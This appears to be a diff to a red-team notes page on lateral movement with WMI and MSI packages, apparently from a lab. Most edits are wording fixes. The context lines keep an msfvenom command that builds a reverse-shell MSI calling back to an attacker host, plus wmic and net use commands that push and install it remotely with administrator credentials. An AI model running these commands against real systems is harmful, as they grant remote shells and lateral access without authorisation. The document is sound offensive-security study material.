@@ -1,3 +1,7 @@
+---
+description: WMI lateral movement with .msi packages
+---
+
 # WMI + MSI Lateral Movement
 
 ## Execution
@@ -14,7 +18,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f msi > evil
 
 ![](../.gitbook/assets/screenshot-from-2018-10-19-17-31-00.png)
 
-I tried executing the .msi payload like so, but got a return code `1619` and quick search on google showed  nothing usefull:
+I tried executing the .msi payload like so, but got a return code `1619` and a quick search on google returned nothing useful:
 
 {% code-tabs %}
 {% code-tabs-item title="attacker@remote" %}
@@ -26,7 +30,7 @@ wmic /node:10.0.0.7 /user:offense\administrator product call install PackageLoca
 
 ![](../.gitbook/assets/screenshot-from-2018-10-19-18-45-55.png)
 
-So I had to revert to a filthy way of achieving the goal:
+I had to revert to a filthy way of achieving the goal:
 
 {% code-tabs %}
 {% code-tabs-item title="attacker@remote" %}
@@ -38,7 +42,7 @@ net use \\10.0.0.7\c$ /user:administrator@offense; copy C:\experiments\evil64.ms
 
 ![](../.gitbook/assets/peek-2018-10-19-18-41.gif)
 
-Additionally, the same could of course be achieved using powershell cmdlets:
+Additionally, the same could of be achieved using powershell cmdlets:
 
 {% code-tabs %}
 {% code-tabs-item title="attacker@remote" %}
